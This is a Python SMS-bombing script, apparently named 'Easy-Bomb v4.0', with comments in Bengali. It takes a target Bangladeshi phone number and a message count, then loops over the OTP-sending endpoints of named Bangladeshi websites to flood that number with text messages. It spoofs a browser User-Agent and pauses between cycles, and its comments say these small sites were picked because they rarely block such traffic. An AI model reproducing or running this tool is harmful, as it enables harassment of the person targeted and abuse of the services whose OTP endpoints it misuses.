import os, time, threading, requests

PASSWORD = "takbir0099"

# হেডার ব্যবহার করলে সার্ভার মনে করবে এটি আসল ব্রাউজার থেকে আসছে
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Content-Type': 'application/json'
}

def banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(r"""\033[1;32m
  ████████╗ █████╗ ██╗  ██╗██████╗ ██╗██████╗ 
  ╚══██╔══╝██╔══██╗██║ ██╔╝██╔══██╗██║██╔══██╗
     ██║   ███████║█████╔╝ ██████╔╝██║██████╔╝
     ██║   ██╔══██║██╔═██╗ ██╔══██╗██║██╔══██╗
     ██║   ██║  ██║██║  ██╗██████╔╝██║██║  ██╗
     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝
             Takbir Ahmed / Easy-Bomb v4.0
\033[0m""")

def password_prompt():
    print("\033[1;31m[!] Password Protected Tool\033[0m")
    if input("Enter Password: ") != PASSWORD:
        print("Wrong!"); exit()

def update_counter(count):
    print(f"\033[1;36m[+] SMS Sent Successfully: {count}\033[0m")

def start():
    banner()
    password_prompt()
    
    number = input("\nTarget Number (01XXXXXXXXX): ")
    if len(number) != 11:
        print("Invalid Number!"); return
        
    amount = int(input("How many SMS?: "))
    
    # এই API গুলো বর্তমানে ছোট সাইট হওয়ার কারণে সহজে ব্লক করে না
    api_list = [
        # Fundesh (GET API)
        f"https://fundesh.com.bd/api/auth/generateOTP?phone={number}",
        # OsudPotro (POST API) - এটি অনেক ফাস্ট কাজ করে
        "https://api.osudpotro.com/api/v1/users/send_otp",
        # Medeasy (POST API)
        "https://api.medeasy.health/api/v1/patient-auth/send-otp"
    ]

    print("\n\033[1;33m[!] Bombing Started...\033[0m")
    sent = 0
    
    for i in range(amount):
        # API 1: Fundesh (GET)
        try:
            requests.get(api_list[0], headers=HEADERS, timeout=10)
            sent += 1
            update_counter(sent)
        except: pass

        # API 2: OsudPotro (POST)
        try:
            requests.post(api_list[1], json={"phone": number}, headers=HEADERS, timeout=10)
            sent += 1
            update_counter(sent)
        except: pass

        # সার্ভার থেকে ব্লক হওয়া এড়াতে প্রতি সাইকেলের পর ২ সেকেন্ড বিরতি
        time.sleep(2)
        
        if sent >= amount: break

    print("\n\033[1;32m[✔] Task Finished!\033[0m")

if __name__ == "__main__":
    start()
